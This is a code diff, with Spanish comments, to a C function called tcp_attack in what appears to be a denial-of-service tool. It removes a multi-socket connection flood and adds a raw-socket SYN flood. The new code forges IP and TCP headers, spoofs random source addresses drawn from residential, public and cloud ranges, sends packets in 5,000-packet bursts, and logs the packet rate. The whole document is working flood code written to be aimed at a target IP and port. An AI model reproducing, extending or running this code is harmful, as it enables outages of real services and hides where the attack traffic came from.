@@ -281,142 +281,168 @@ void* game_attack(void* arg) {
     return NULL;
 }
 
+// TCP AQUI VA XD
 void* tcp_attack(void* arg) {
     char* params = (char*)arg;
     char ip[64];
     int port, duration;
     
     sscanf(params, "%63s %d %d", ip, &port, &duration);
+    log_msg("TCP RAW SYN FLOOD started (ROOT required)");
     
     time_t end = time(NULL) + duration;
-    struct sockaddr_in target;
-    target.sin_family = AF_INET;
-    target.sin_port = htons(port);
-    inet_pton(AF_INET, ip, &target.sin_addr);
+    uint32_t target_ip = inet_addr(ip);
+   
     
-    // ✅ CONFIG AUTO-AJUSTADA
-    int MAX_SOCKS = MAX_TOTAL_SOCKS;        // CAMBIADO
-    int BATCH_SIZE = TCP_SOCKET_POOL / 5;   // CAMBIADO
-    int REUSE_TIMES = 50;
-    
-    // Pool de sockets BRUTO
-    int *socks = malloc(MAX_SOCKS * sizeof(int));
-    int active = 0;
-    
-    // 🔥 PAYLOADS VARIADOS
-    char* payloads[] = {
-        "GET / HTTP/1.1\r\nHost: 0.0.0.0\r\n\r\n",
-        "POST /login.php HTTP/1.1\r\n\r\n",
-        "HEAD /admin HTTP/1.1\r\n\r\n",
-        "OPTIONS * HTTP/1.1\r\n\r\n",
-        "\xFF\xFD\x18\xFF\xFD\x20\xFF\xFD\x23",
-        "\x16\x03\x01",
-        "SSH-2.0-",
-        "HELO localhost\r\n",
-        "<?xml version='1.0'?>",
-        "{\"action\":\"ping\"}"
-    };
-    int num_payloads = 10;
-    
-    // ⚡ CREAR SOCKETS INICIALES
-    for(int i = 0; i < TCP_SOCKET_POOL && i < MAX_SOCKS; i++) {  // CAMBIADO
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if(sock >= 0) {
-            // CONFIG BRUTAL
-            int yes = 1;
-            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
-            setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &yes, sizeof(yes));
-            
-            struct linger ling = {1, 0};
-            setsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
-            
-            // ✅ Buffer auto-ajustado
-            int sndbuf = SEND_BUFFER_MB * 1024 * 1024;  // CAMBIADO
-            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-            
-            // Non-blocking
-            fcntl(sock, F_SETFL, O_NONBLOCK);
-            
-            // Bind a puerto aleatorio
-            struct sockaddr_in src_addr = {0};
-            src_addr.sin_family = AF_INET;
-            src_addr.sin_port = htons(1024 + (rand() % 64512));
-            bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr));
-            
-            socks[active++] = sock;
-        }
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(sock < 0) {
+        log_msg("TCP RAW failed: Need ROOT privileges!");
+        free(params);
+        return NULL;
     }
     
-    // 💥 BUCLE DE ATAQUE BRUTO
-    int cycle = 0;
+    // Permitir escribir headers IP manualmente
+    int one = 1;
+    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        log_msg("TCP RAW: IP_HDRINCL failed");
+        close(sock);
+        free(params);
+        return NULL;
+    }
+    
+    // Configurar destino
+    struct sockaddr_in dest;
+    memset(&dest, 0, sizeof(dest));
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(port);
+    dest.sin_addr.s_addr = target_ip;
+    
+    // Buffer para paquete
+    char packet[4096];
+    struct iphdr *iph = (struct iphdr *)packet;
+    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    
+    // Variables de control
+    srand(time(NULL));
+    long packet_count = 0;
+    time_t last_stats = time(NULL);
+    
+    // 🔥 BUCLE DE ATAQUE PRINCIPAL
     while(running && time(NULL) < end) {
-        cycle++;
-        
-        // 1. CONECTAR Y ENVIAR
-        for(int i = 0; i < active; i++) {
-            if(socks[i] < 0) continue;
+        // Ráfaga de paquetes por ciclo
+        for(int burst = 0; burst < 5000; burst++) {
+            memset(packet, 0, sizeof(packet));
             
-            connect(socks[i], (struct sockaddr*)&target, sizeof(target));
+            // ===== IP HEADER =====
+            iph->ihl = 5;
+            iph->version = 4;
+            iph->tos = 0;
+            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+            iph->id = htons(rand() % 65535);
+            iph->frag_off = 0;
+            iph->ttl = 64 + (rand() % 64);  // TTL variable
             
-            // ✅ Paquetes auto-ajustados
-            for(int p = 0; p < (PACKETS_PER_CYCLE/200); p++) {  // CAMBIADO
-                int payload_idx = rand() % num_payloads;
-                char *payload = payloads[payload_idx];
-                int len = strlen(payload);
-                
-                if(rand() % 3 == 0) {
-                    char buffer[1500];
-                    memcpy(buffer, payload, len);
-                    for(int j = len; j < (PACKETS_PER_CYCLE/2); j++)  // CAMBIADO
-                        buffer[j] = rand() % 256;
-                    send(socks[i], buffer, PACKETS_PER_CYCLE/2, MSG_NOSIGNAL | MSG_DONTWAIT);  // CAMBIADO
-                } else {
-                    send(socks[i], payload, len, MSG_NOSIGNAL | MSG_DONTWAIT);
+            // Protocolo TCP
+            iph->protocol = IPPROTO_TCP;
+            iph->check = 0;
+            
+            // IP SPOOFING: Origen aleatorio
+            uint32_t src_ip;
+            int ip_type = rand() % 10;
+            
+            if(ip_type < 4) {
+                // IPs residenciales (192.168.x.x)
+                src_ip = (192 << 24) | (168 << 16) | (rand() % 256 << 8) | (rand() % 256);
+            } else if(ip_type < 7) {
+                // IPs públicas normales
+                src_ip = rand() % 0xFFFFFFFF;
+                // Asegurar que no sea 0.0.0.0, 127.x.x.x, 224-255.x.x.x
+                while((src_ip & 0xFF000000) == 0 || 
+                      (src_ip & 0xFF000000) == 0x7F000000 ||
+                      (src_ip & 0xF0000000) == 0xE0000000) {
+                    src_ip = rand() % 0xFFFFFFFF;
                 }
+            } else {
+                // IPs de cloud/CDN
+                src_ip = (rand() % 5 + 100) << 24 | 
+                        (rand() % 256 << 16) | 
+                        (rand() % 256 << 8) | 
+                        (rand() % 256);
             }
             
-            shutdown(socks[i], SHUT_RDWR);
-        }
-        
-        // 2. CREAR MÁS SOCKETS SI HAY ESPACIO
-        if(active < MAX_SOCKS * 0.8) {
-            int to_create = BATCH_SIZE;
-            if(to_create > MAX_SOCKS - active) 
-                to_create = MAX_SOCKS - active;
+            iph->saddr = src_ip;
+            iph->daddr = target_ip;
             
-            for(int i = 0; i < to_create; i++) {
-                int sock = socket(AF_INET, SOCK_STREAM, 0);
-                if(sock >= 0) {
-                    int yes = 1;
-                    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
-                    fcntl(sock, F_SETFL, O_NONBLOCK);
-                    socks[active++] = sock;
-                }
+            // Checksum IP (simplificado)
+            iph->check = 0;
+            unsigned short *ip_ptr = (unsigned short *)iph;
+            unsigned int ip_sum = 0;
+            for(int i = 0; i < sizeof(struct iphdr)/2; i++) {
+                ip_sum += ip_ptr[i];
+            }
+            iph->check = ~((ip_sum & 0xFFFF) + (ip_sum >> 16));
+            
+            // ===== TCP HEADER =====
+            // Puerto origen aleatorio
+            tcph->source = htons(49152 + (rand() % 16384));
+            tcph->dest = htons(port);
+            
+            // Sequence number aleatorio
+            tcph->seq = htonl(rand() % 4294967295);
+            tcph->ack_seq = 0;
+            
+            // Header length y flags
+            tcph->doff = 5;  // 20 bytes
+            
+            // Flags: SOLO SYN (SYN flood)
+            tcph->syn = 1;
+            tcph->ack = 0;
+            tcph->rst = 0;
+            tcph->psh = 0;
+            tcph->fin = 0;
+            tcph->urg = 0;
+            
+            // Window size grande
+            tcph->window = htons(65535);
+            tcph->check = 0;  // Sin checksum para velocidad
+            tcph->urg_ptr = 0;
+            
+            // ===== ENVIAR PAQUETE =====
+            if(sendto(sock, packet, ntohs(iph->tot_len), 0,
+                     (struct sockaddr*)&dest, sizeof(dest)) > 0) {
+                packet_count++;
+            }
+            
+            // Micro-pausa cada 100 paquetes
+            if(burst % 100 == 0) {
+                usleep(1);
             }
         }
         
-        // ✅ Sleep auto-ajustado
-        usleep(CYCLE_SLEEP_US/2);  // CAMBIADO
-        
-        // ✅ Limpieza auto-ajustada
-        if(cycle % (100 - (ARCH_POWER/2)) == 0) {  // CAMBIADO
-            int new_idx = 0;
-            for(int i = 0; i < active; i++) {
-                if(socks[i] >= 0) {
-                    socks[new_idx++] = socks[i];
-                }
-            }
-            active = new_idx;
+        // ===== ESTADÍSTICAS =====
+        if(time(NULL) - last_stats >= 5) {
+            char stats[128];
+            snprintf(stats, sizeof(stats),
+                    "TCP RAW: %ldk packets | %.0f PPS",
+                    packet_count / 1000,
+                    (double)packet_count / (time(NULL) - last_stats + 1));
+            log_msg(stats);
+            last_stats = time(NULL);
         }
+        
+        // Pausa entre ráfagas
+        usleep(1000);
     }
     
-    // 🧹 LIMPIEZA
-    for(int i = 0; i < active; i++) {
-        if(socks[i] >= 0) close(socks[i]);
-    }
-    free(socks);
+    // Limpieza
+    close(sock);
+    
+    char finish_msg[128];
+    snprintf(finish_msg, sizeof(finish_msg),
+            "TCP RAW finished: %ld total packets", packet_count);
+    log_msg(finish_msg);
+    
     free(params);
-    
     return NULL;
 }
 
